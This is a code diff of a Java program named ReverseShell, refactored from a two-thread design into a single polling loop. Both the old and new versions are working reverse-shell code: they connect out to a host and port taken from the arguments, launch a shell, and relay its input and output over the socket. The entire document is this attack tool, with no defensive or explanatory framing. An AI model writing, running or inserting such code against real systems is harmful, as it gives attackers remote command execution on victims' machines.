@@ -1,10 +1,9 @@
 import java.io.InputStream;
 import java.io.OutputStream;
-import java.io.IOException;
 import java.net.Socket;
 
 public class ReverseShell {
-    public static void main(String[] args) {
+    public static void main(String[] args) throws Exception {
         if (args.length != 3) {
             System.exit(1);
         }
@@ -13,49 +12,30 @@ public class ReverseShell {
         int port = Integer.parseInt(args[1]);
         String shell = args[2];
 
-        try {
-            Socket socket = new Socket(host, port);
+        Socket sock = new Socket(host, port);
+        Process proc = new ProcessBuilder(shell).redirectErrorStream(true).start();
 
-            Process process = new ProcessBuilder(shell).redirectErrorStream(true).start();
-            InputStream processInput = process.getInputStream();
-            OutputStream processOutput = process.getOutputStream();
+        InputStream pi = proc.getInputStream();
+        OutputStream po = proc.getOutputStream();
+        InputStream si = sock.getInputStream();
+        OutputStream so = sock.getOutputStream();
 
-            InputStream socketInput = socket.getInputStream();
-            OutputStream socketOutput = socket.getOutputStream();
+        while (!sock.isClosed()) {
+            while (pi.available() > 0) {
+                so.write(pi.read());
+            }
 
-            Thread t1 = new Thread(() -> {
-                try {
-                    byte[] buffer = new byte[1024];
-                    int len;
-                    while ((len = processInput.read(buffer)) != -1) {
-                        socketOutput.write(buffer, 0, len);
-                        socketOutput.flush();
-                    }
-                } catch (IOException ignored) {}
-            });
+            while (si.available() > 0) {
+                po.write(si.read());
+            }
 
-            Thread t2 = new Thread(() -> {
-                try {
-                    byte[] buffer = new byte[1024];
-                    int len;
-                    while ((len = socketInput.read(buffer)) != -1) {
-                        processOutput.write(buffer, 0, len);
-                        processOutput.flush();
-                    }
-                } catch (IOException ignored) {}
-            });
+            so.flush();
+            po.flush();
 
-            t1.start();
-            t2.start();
-
-            t1.join();
-            t2.join();
-
-            process.destroy();
-            socket.close();
-
-        } catch (Exception e) {
-            e.printStackTrace();
+            Thread.sleep(100);
         }
+
+        proc.destroy();
+        sock.close();
     }
 }
